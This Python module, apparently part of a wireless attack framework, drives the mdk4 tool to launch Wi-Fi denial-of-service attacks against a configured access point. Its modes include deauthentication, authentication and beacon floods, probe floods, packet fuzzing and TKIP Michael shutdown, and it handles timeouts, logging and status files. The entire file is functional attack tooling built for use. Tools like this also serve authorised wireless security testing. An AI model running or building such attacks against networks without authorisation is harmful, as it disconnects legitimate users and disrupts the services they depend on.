"""DoS attack handler using mdk4.
Supports configurable mode, packet speed, and extra options."""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from _log_util import log, ToolOutputLogger, drain_stdout

STATUS_INTERVAL = 10

MDK4_MODES = {
    "d": "Deauthentication / Disassociation",
    "a": "Authentication flood",
    "b": "Beacon flood",
    "f": "Packet fuzzer",
    "m": "Michael (TKIP) shutdown",
    "s": "Probe request flood",
    "w": "WIDS confusion",
}

IMPORTANT_RE = [
    re.compile(r"packets", re.I),
    re.compile(r"client", re.I),
    re.compile(r"deauth", re.I),
]


def _is_stop_requested() -> bool:
    from attack_runner import is_stop_requested
    return is_stop_requested()


def _build_mdk4_cmd(
    interface: str,
    mode: str,
    bssid: str,
    client_mac: str | None,
    channel: int | str | None,
    speed: int | str | None,
) -> tuple[list[str], list[str]]:
    """Build mode-aware mdk4 command and return warnings."""
    cmd = ["mdk4", interface, mode]
    warnings: list[str] = []

    if mode == "a":
        if not bssid:
            raise ValueError("mdk4 mode 'a' requires bssid")
        cmd += ["-a", bssid]
        if client_mac:
            warnings.append("client_mac ignored for mdk4 mode 'a'")
        if channel:
            warnings.append("channel ignored for mdk4 mode 'a'")
    elif mode == "d":
        if bssid:
            cmd += ["-B", bssid]
        if channel:
            cmd += ["-c", str(channel)]
        if client_mac:
            warnings.append("client_mac is not supported by mdk4 mode 'd' and will be ignored")
    else:
        if bssid:
            cmd += ["-B", bssid]
        if client_mac:
            cmd += ["-S", client_mac]
        if channel:
            cmd += ["-c", str(channel)]

    if speed:
        cmd += ["-s", str(speed)]

    return cmd, warnings


def run(config: dict, data_dir: Path) -> None:
    bssid = config["bssid"]
    interface = config["interface"]
    mode = config.get("mode", "d")
    client_mac = config.get("client_mac")
    channel = config.get("channel")
    timeout = config.get("timeout", 60)
    speed = config.get("speed")

    log_path = data_dir / "log.txt"

    try:
        cmd, cmd_warnings = _build_mdk4_cmd(interface, mode, bssid, client_mac, channel, speed)
    except ValueError as e:
        raise RuntimeError(f"Invalid DoS configuration: {e}") from e

    mode_desc = MDK4_MODES.get(mode, mode)
    log(log_path, "=== DoS Attack (mdk4) ===")
    log(log_path, f"mode:      {mode} - {mode_desc}")
    log(log_path, f"bssid:     {bssid}")
    log(log_path, f"channel:   {channel or 'auto'}")
    log(log_path, f"interface: {interface}")
    log(log_path, f"speed:     {speed or 'default'} pps")
    log(log_path, f"timeout:   {timeout}s")
    log(log_path, f"exec: {' '.join(cmd)}")
    for warning in cmd_warnings:
        log(log_path, f"warning: {warning}")

    _update_status(data_dir, "running", f"mdk4 {mode_desc}")

    start = time.time()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tl = ToolOutputLogger(log_path, prefix="mdk4> ")
    last_status = 0.0
    stopped = False

    try:
        while time.time() - start < timeout:
            if _is_stop_requested():
                stopped = True
                log(log_path, "stop requested")
                break
            if proc.poll() is not None:
                drain_stdout(proc, tl, IMPORTANT_RE)
                log(log_path, f"mdk4 exited (code={proc.returncode})")
                break

            drain_stdout(proc, tl, IMPORTANT_RE)

            elapsed = time.time() - start
            if elapsed - last_status >= STATUS_INTERVAL:
                progress = f"mdk4 {mode} ({int(elapsed)}s)"
                if tl.last_status:
                    progress += f" | {tl.last_status[:100]}"
                _update_status(data_dir, "running", progress)
                last_status = elapsed
            time.sleep(0.3)

        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)
    except Exception as e:
        log(log_path, f"error: {e}")
        if proc.poll() is None:
            proc.terminate()

    duration = round(time.time() - start, 1)
    log(log_path, f"=== Done: {duration}s, exit={proc.returncode} ===")

    result = {
        "bssid": bssid,
        "mode": mode,
        "speed": speed,
        "stopped_early": stopped,
        "duration_s": duration,
        "exit_code": proc.returncode,
    }
    (data_dir / "result.json").write_text(json.dumps(result, indent=2))

    if not stopped and proc.returncode not in (0, None):
        raise RuntimeError(f"mdk4 failed with exit code {proc.returncode}")


def _update_status(data_dir: Path, status: str, progress: str) -> None:
    payload = {
        "status": status,
        "progress": progress,
        "started_at": os.environ.get("_RUNNER_STARTED_AT", ""),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    (data_dir / "status.json").write_text(json.dumps(payload, indent=2))
